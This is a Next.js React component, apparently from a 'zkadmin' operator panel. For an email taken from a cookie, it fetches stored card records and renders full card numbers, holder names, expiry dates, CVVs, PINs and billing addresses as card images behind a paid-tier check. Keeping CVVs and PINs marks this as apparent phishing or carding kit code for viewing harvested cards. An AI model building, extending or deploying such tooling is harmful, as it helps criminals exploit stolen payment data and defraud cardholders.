"use client";
import { useEffect, useState } from "react";
import { authUser } from "@/app/actions/authUser";
import { getCardDetails as fetchCardDetails } from "@/app/zkadmin/action/suspended";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import styles from "./cardDetails.module.css";

const Zkclientatm = () => {
    // const [userData, setUserData] = useState([]);
    const [cardDetails, setCardDetails] = useState([]);
    const router = useRouter();

    useEffect(() => {
      async function checkVersion() {
        try {
          const response = await fetch('/api/check-version');
          const data = await response.json();
          console.log("data",data);

          if (data.isFreeTier) {
            router.push('/zkadmin/access-denied');
          } else {
            // setIsPremium(true);
          }
        } catch (error) {
          console.error('Error checking version:', error);
        } finally {
          // setLoading(false);
        }
      }

      checkVersion();
    }, [router]);


    useEffect(() => {
      const email = Cookies.get("cardDetailsEmail"); // fixed: pass a string, not an array
      const input = { email: email };
      async function fetchDetails() {
        try {
          const res = await fetch("/api/card-details", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(input),
          });

          const data = await res.json();
          setCardDetails(data);
        } catch (error) {
          console.log(error);
        }
      }

      if (email) {
        fetchDetails();
      }
    }, []);

    return (
      <div className={styles.container}>
        <h1 className={styles.title}>Card Details</h1>
        <div className={styles.cardsContainer}>
          {cardDetails.map((data) => (
            <div key={data._id} className={styles.cardWrapper}>
              <div className={styles.cardFront}>
                <div className={styles.cardHeader}>
                  <div className={styles.chipIcon}>
                    <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <rect x="10" y="10" width="80" height="80" rx="10" fill="gold" />
                      <rect x="25" y="25" width="50" height="50" rx="5" fill="#555" fillOpacity="0.5" />
                    </svg>
                  </div>
                  <div className={styles.cardType}>CREDIT</div>
                </div>

                <div className={styles.cardNumber}>
                  {data.cardNumber && data.cardNumber.match(/.{1,4}/g).join(' ')}
                </div>

                <div className={styles.cardDetails}>
                  <div className={styles.cardHolder}>
                    <div className={styles.label}>CARD HOLDER</div>
                    <div className={styles.value}>{data.nameOnCard}</div>
                  </div>

                  <div className={styles.cardExpiry}>
                    <div className={styles.label}>EXPIRES</div>
                    <div className={styles.value}>{data.expiry}</div>
                  </div>
                </div>
              </div>

              <div className={styles.cardBack}>
                <div className={styles.cardInfo}>
                  <div className={styles.infoItem}>
                    <span className={styles.infoLabel}>CVV:</span>
                    <span className={styles.infoValue}>{data.cvv}</span>
                  </div>
                  <div className={styles.infoItem}>
                    <span className={styles.infoLabel}>PIN:</span>
                    <span className={styles.infoValue}>{data.pin}</span>
                  </div>
                </div>

                <div className={styles.addressSection}>
                  <h3 className={styles.addressTitle}>Billing Address</h3>
                  <div className={styles.addressContent}>
                    <p>{data.addressLineOne}</p>
                    {data.addressLineTwo && <p>{data.addressLineTwo}</p>}
                    <p>{data.city}, {data.stateOrProvince} {data.zipOrPostalCode}</p>
                    <p>{data.country}</p>
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    );
}

export default Zkclientatm;